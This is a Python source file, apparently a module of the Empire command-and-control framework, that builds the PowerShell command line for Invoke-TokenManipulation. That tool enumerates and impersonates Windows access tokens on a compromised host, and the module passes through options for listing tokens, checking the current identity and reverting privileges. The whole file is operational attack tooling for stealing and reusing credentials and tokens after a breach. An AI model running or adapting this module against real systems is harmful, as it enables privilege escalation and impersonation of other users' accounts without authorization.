from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source
from empire.server.utils.option_util import coerce_legacy_value


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):
        script_end = "Invoke-TokenManipulation"

        outputf = params.get("OutputFunction", "Out-String")

        if params["RevToSelf"]:
            script_end += " -RevToSelf"
        if params["WhoAmI"]:
            script_end += " -WhoAmI"
        if params["ShowAll"]:
            script_end += " -ShowAll"
            script_end += (
                f" | {outputf} | "
                + '%{$_ + "`n"};"`n'
                + str(module.name.split("/")[-1])
                + ' completed!"'
            )

        for option, raw_value in params.items():
            values = coerce_legacy_value(raw_value)
            if (
                option.lower()
                not in ["agent", "outputfunction", "revtoself", "whoami", "showall"]
                and values
                and values.lower() != "false"
            ):
                if values.lower() == "true":
                    script_end += " -" + str(option)
                else:
                    script_end += " -" + str(option) + " " + str(values)

        if script.endswith("Invoke-TokenManipulation") or script.endswith("-ShowAll"):
            script_end += "| Select-Object Domain, Username, ProcessId, IsElevated, TokenType | ft -autosize"
            script_end += (
                f" | {outputf} | "
                + '%{$_ + "`n"};"`n'
                + str(module.name.split("/")[-1])
                + ' completed!"'
            )
        else:
            script_end += (
                f" | {outputf} | "
                + '%{$_ + "`n"};"`n'
                + str(module.name.split("/")[-1])
                + ' completed!"'
            )
            if not params["RevToSelf"]:
                script_end += ';"`nUse credentials/tokens with RevToSelf option to revert token privileges"'

        return script, script_end
